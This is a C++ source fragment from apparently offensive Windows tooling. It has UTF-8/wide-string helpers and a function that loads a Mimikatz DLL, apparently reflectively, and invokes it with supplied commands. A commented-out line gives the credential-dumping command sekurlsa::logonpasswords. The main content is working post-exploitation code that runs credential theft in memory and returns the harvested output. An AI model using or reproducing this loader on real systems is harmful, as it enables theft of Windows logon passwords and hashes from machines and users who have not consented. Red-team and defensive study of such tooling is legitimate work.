// Convert wide string to UTF-8
std::string toString(const std::wstring& wstr)
{
	if (wstr.empty()) return {};
	int len = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
	std::string str(len, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), &str[0], len, nullptr, nullptr);
	return str;
}

// Convert UTF-8 to wide string
std::wstring toWstring(const std::string& str)
{
	if (str.empty()) return {};
	int len = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), nullptr, 0);
	std::wstring wstr(len, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], len);
	return wstr;
}

// Convert WCHAR to std::string
std::string WCharToString(const WCHAR* wstr) {
	if (!wstr) return "";

	int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
	if (size_needed <= 0) return "";

	std::string str(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &str[0], size_needed, nullptr, nullptr);
	str.pop_back(); // remove null terminator added by WideCharToMultiByte
	return str;
}

std::string load_execute_mimikatz(std::string &dll, const std::string &commands) {
	HMODULE hMimikatz = loadDll(dll);
	if (!hMimikatz)
	{
		printf("failed to load mimikatz DLL\n");
	}

	typedef void(WINAPI *Function)();
	typedef LPWSTR(WINAPI *FunctionWStr)(LPCWSTR);

#if _DEBUG
	LoadLibraryA("User32.dll");
#endif

	Function initFunction = (Function)GetProcAddressR(hMimikatz, "Init");
	if (!initFunction)
	{
		printf("[DEBUG] initFunction FAILED\n");
	}
	else {
#if _DEBUG
		printf("[+] Calling init functon\n");
#endif
		initFunction();
	}

	FunctionWStr invokeFunction = (FunctionWStr)GetProcAddressR(hMimikatz, "Invoke");
	std::wstring myout = L"";
	if (invokeFunction)
	{
#if _DEBUG
		printf("[+] Calling Invoke functon\n");
#endif
		//std::wstring cmd = L"privilege::debug;sekurlsa::logonpasswords;exit";
		
		std::wstring cmd = toWstring(commands);

		LPWSTR output = invokeFunction(cmd.c_str());
		myout = output;

		//*wout = myout;
		// NOTE: convert if you need to use an ASCII string.

#if _DEBUG
		printf("output is : \n");
		wprintf(myout.c_str());
		printf("\n");
#endif
	}

	Function cleanupFunction = (Function)GetProcAddressR(hMimikatz, "Cleanup");
	if (cleanupFunction)
	{
#if _DEBUG
		printf("[+] Calling cleanup functon\n");
#endif
		cleanupFunction();
		//iRet = 0;
	}

	if (hMimikatz)
		FreeLibrary(hMimikatz);

	return toString(myout);
}

